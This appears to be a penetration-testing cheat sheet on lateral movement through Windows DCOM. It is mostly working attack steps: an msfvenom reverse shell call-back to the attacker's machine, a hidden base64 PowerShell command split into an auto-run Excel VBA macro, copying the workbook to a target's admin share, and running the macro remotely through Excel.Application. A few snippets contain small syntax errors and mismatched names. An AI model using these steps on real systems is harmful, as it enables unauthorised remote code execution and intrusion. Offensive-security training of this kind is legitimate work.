# DCOM

## Distributed Component Object Model (DCOM)

DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook

Important:

* It requires RPC port 135 and local admin access to call the DCOM Service Control Manager (API).
* The `run` method within DCOM allows us to execute a VBA macro remotely.

Create a reverse shell payload:

```shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=4444 -f hta-psh -o evil.hta
```

Split payload into smaller chunks starting with:

```python
str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Create a VBA macro and insert it into Excel file:

```vba
Sub AutoOpen()
    exploit
End Sub
Sub Document_Open()
    exploit
End Sub
Sub exploit()
        Dim str As String
        {insert_payload_here}
        # OPTION 1
        Shell (Str)                    
        # OPTION 2
        # CreateObject("Wscript.Shell").Run str
End Sub
```

Check if the document contains a valid exploit macro:

```shell
$ mraptor [exploit.doc]
```

> **Now is time for the Dropper**: Copy file to the remote target and execute the payload!

Create an instance of the object `Excel.Application`:

```powershell
$com [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))
```

Copy the Excel file containing the VBA payload to target machine:

```powershell
$LocalPath = "C:\Users\[user]\badexcel.xls
$RemotePath = "\\[target]\c$\badexcel.xls
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

Create a SYSTEM profile, this is required as part of the opening process:

```powershell
$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
```

Open the Excel file and execute the macro:

```vba
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```
